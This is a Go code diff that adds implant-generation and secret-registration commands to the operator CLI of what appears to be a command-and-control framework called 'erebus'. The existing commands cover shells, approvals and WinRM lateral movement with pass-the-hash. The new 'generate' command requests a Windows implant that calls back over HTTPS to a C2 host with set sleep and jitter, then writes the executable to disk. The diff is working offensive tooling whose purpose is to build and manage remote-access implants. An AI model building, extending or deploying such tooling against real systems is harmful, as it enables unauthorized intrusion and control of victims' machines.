@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"time"
 
@@ -29,7 +30,7 @@ type OpOptions struct {
 // RunOp executes a one-shot operator command (sessions|shell|lateral|pending|approve-all).
 func RunOp(opts OpOptions, args []string) error {
 	if len(args) < 1 {
-		return fmt.Errorf("usage: erebus op <sessions|shell|lateral|pending|approve-all|help> [args]")
+		return fmt.Errorf("usage: erebus op <sessions|shell|lateral|pending|approve-all|generate|register-secret|help> [args]")
 	}
 	if opts.Server == "" {
 		opts.Server = "127.0.0.1:50051"
@@ -73,6 +74,10 @@ func RunOp(opts OpOptions, args []string) error {
 		return opShell(opts, rest)
 	case "lateral":
 		return opLateral(opts, rest)
+	case "generate":
+		return opGenerate(opts, rest)
+	case "register-secret":
+		return opRegisterSecret(opts, rest)
 	default:
 		return fmt.Errorf("unknown op command %q (try: erebus op help)", cmd)
 	}
@@ -85,6 +90,8 @@ const opHelp = `erebus op — non-interactive operator commands (dual-seat auto-
   erebus op approve-all
   erebus op shell [--session ID] <command...>
   erebus op lateral winrm <target> <command> --user U --domain D (--pass P | --hash H)
+  erebus op generate --os windows --language c --callback https://C2:8443 --out implant.exe
+  erebus op register-secret <implant_id> <secret_hex> [build_id]
 
 Uses ~/.erebus/certs/operator*.pem and approver*.pem by default.
 Flags (before subcommand): -server -cert -key -ca -approver-cert -approver-key
@@ -400,6 +407,156 @@ func executeWithAutoApprove(
 		return r.err
 	}
 	return handle(r.resp.Result)
+}
+
+func opGenerate(opts OpOptions, args []string) error {
+	osName := "windows"
+	arch := "amd64"
+	format := "exe"
+	sleepMs := int64(500)
+	jitter := int32(10)
+	language := "c"
+	outPath := ""
+	var callbacks []string
+	for i := 0; i < len(args); i++ {
+		need := func() (string, error) {
+			if i+1 >= len(args) {
+				return "", fmt.Errorf("%s requires a value", args[i])
+			}
+			i++
+			return args[i], nil
+		}
+		switch args[i] {
+		case "--os":
+			v, err := need()
+			if err != nil {
+				return err
+			}
+			osName = v
+		case "--arch":
+			v, err := need()
+			if err != nil {
+				return err
+			}
+			arch = v
+		case "--format":
+			v, err := need()
+			if err != nil {
+				return err
+			}
+			format = v
+		case "--sleep":
+			v, err := need()
+			if err != nil {
+				return err
+			}
+			ms, err := strconv.ParseInt(v, 10, 64)
+			if err != nil {
+				return fmt.Errorf("--sleep: %w", err)
+			}
+			sleepMs = ms
+		case "--jitter":
+			v, err := need()
+			if err != nil {
+				return err
+			}
+			j, err := strconv.ParseInt(v, 10, 32)
+			if err != nil {
+				return fmt.Errorf("--jitter: %w", err)
+			}
+			jitter = int32(j)
+		case "--callback":
+			v, err := need()
+			if err != nil {
+				return err
+			}
+			callbacks = append(callbacks, v)
+		case "--language", "--lang":
+			v, err := need()
+			if err != nil {
+				return err
+			}
+			language = v
+		case "--out", "-o":
+			v, err := need()
+			if err != nil {
+				return err
+			}
+			outPath = v
+		default:
+			return fmt.Errorf("unknown generate flag %q", args[i])
+		}
+	}
+	if len(callbacks) == 0 {
+		return fmt.Errorf("--callback URL required")
+	}
+	conn, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Minute)
+	defer cancel()
+	fmt.Printf("Building implant language=%s os=%s arch=%s format=%s sleep=%dms …\n",
+		language, osName, arch, format, sleepMs)
+	resp, err := pb.NewErebusC2Client(conn).GenerateImplant(ctx, &pb.GenerateImplantRequest{
+		Os:        osName,
+		Arch:      arch,
+		Transport: "https",
+		Callbacks: callbacks,
+		SleepMs:   sleepMs,
+		JitterPct: jitter,
+		Format:    format,
+		Language:  language,
+	})
+	if err != nil {
+		return err
+	}
+	if !resp.Success {
+		return fmt.Errorf("generate failed: %s", resp.Error)
+	}
+	if outPath == "" {
+		outPath = resp.Filename
+		if outPath == "" {
+			outPath = "implant.bin"
+		}
+	}
+	if err := os.WriteFile(outPath, resp.Binary, 0o750); err != nil {
+		return err
+	}
+	fmt.Printf("OK build_id=%s format=%s size=%d bytes → %s\n",
+		resp.BuildId, resp.Format, len(resp.Binary), outPath)
+	return nil
+}
+
+func opRegisterSecret(opts OpOptions, args []string) error {
+	if len(args) < 2 {
+		return fmt.Errorf("usage: erebus op register-secret <implant_id> <secret_hex> [build_id]")
+	}
+	buildID := "manual"
+	if len(args) >= 3 {
+		buildID = args[2]
+	}
+	conn, err := dialOp(opts.Server, opts.CertFile, opts.KeyFile, opts.CAFile)
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+	resp, err := pb.NewErebusC2Client(conn).RegisterImplantSecret(ctx, &pb.RegisterImplantSecretRequest{
+		ImplantId: args[0],
+		SecretHex: args[1],
+		BuildId:   buildID,
+	})
+	if err != nil {
+		return err
+	}
+	if !resp.Success {
+		return fmt.Errorf("%s", resp.Error)
+	}
+	fmt.Printf("Registered sealed secret for implant %s (build_id=%s)\n", args[0], buildID)
+	return nil
 }
 
 // RunCertsSeats ensures operator + approver client certs exist under dataDir.
